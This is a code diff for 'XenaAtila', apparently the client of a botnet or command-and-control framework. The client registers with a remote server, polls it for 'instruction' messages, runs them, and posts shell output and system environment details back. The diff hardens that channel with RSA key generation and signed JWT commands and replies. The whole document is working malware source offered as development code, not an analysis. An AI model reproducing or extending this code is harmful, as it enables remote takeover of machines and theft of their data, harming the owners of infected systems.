@@ -1,14 +1,13 @@
 import json
 import logging
-import python_jwt as jwt
 import jwcrypto.jwk as jwk
+import jwcrypto.jwt as jwt
 
 from time import sleep
 from env import Env
 from requests import post, get
 from uuid import uuid4
 from typing import Union
-from base64 import b64encode
 
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -18,6 +17,9 @@ from domains.message import Message
 
 # Unique identifier of this bot instance.
 client_id = str(uuid4())
+private_key_raw = RSA.generate(4096)
+private_key = private_key_raw.export_key('PEM', pkcs=8).decode('utf-8')
+public_key = private_key_raw.publickey().export_key().decode('utf-8')
 
 class XenaAtila:
   def __init__(self):
@@ -31,7 +33,7 @@ class XenaAtila:
         if self.identify(self.remote) == True:
           break
       except Exception as e:
-        logging.debug('Unable to identify for ' + self.remote + ' with the error:' + e)
+        logging.debug('Unable to identify for ' + self.remote + ' with the error:' + str(e))
       sleep(10)
     
     logging.debug('Xena-Atila has been successfuly recognized by ' + self.remote)
@@ -56,8 +58,16 @@ class XenaAtila:
       message = Message.from_json(maybe_message)
 
       subject = message.subject
-      # content = b64decode(message.content).decode('utf-8')
-      content = jwt.verify_jwt(message.content, jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), ['RS512'])[1]
+      try:
+        # content = jwt.verify_jwt(message.content, jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), ['RS512'])[1]
+        receivedToken = jwt.JWT(key = jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), jwt = message.content)
+        content = json.loads(receivedToken.claims)
+      except Exception as e:
+        logging.warning('Unable to verify the token.' + str(e))
+        continue
+      
+      # dec = PKCS1_OAEP.new(Env()['MASTER_PUBLIC_KEY'])
+      # test = dec.decrypt(bytes.fromhex(content['payload']))
 
       if subject != 'instruction':
         return
@@ -101,16 +111,22 @@ class XenaAtila:
         output = json.dumps(System.environment_details())
 
       # Encrypt the response.
-      master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
-      master_public_key = PKCS1_OAEP.new(master_public_key)
-      output = master_public_key.encrypt(bytes(output, encoding = 'utf8'))
+      # master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
+      # master_public_key = PKCS1_OAEP.new(master_public_key)
+      # output = master_public_key.encrypt(bytes(output, encoding = 'utf8'))
+
+      token = jwt.JWT(
+        header = { 'alg': 'RS512' },
+        claims = output,
+      )
+      token.make_signed_token(jwk.JWK.from_pem(private_key.encode()))
 
       # Send the message reply.
       message_insertion = post(self.remote + "/v1/messages", data = {
         'from': client_id,
         'to': None,
         'subject': 'shell-output',
-        'content': b64encode(output),
+        'content': token.serialize(),
         'replyTo': message.id,
       })
 
@@ -131,7 +147,7 @@ class XenaAtila:
   def identify(self, remote_host: str) -> bool:
     response = post(remote_host + '/v1/clients', data = {
       'id': client_id,
-      'publicKey': 'nokey',
+      'publicKey': public_key,
       'status': 'ALIVE',
     })
 
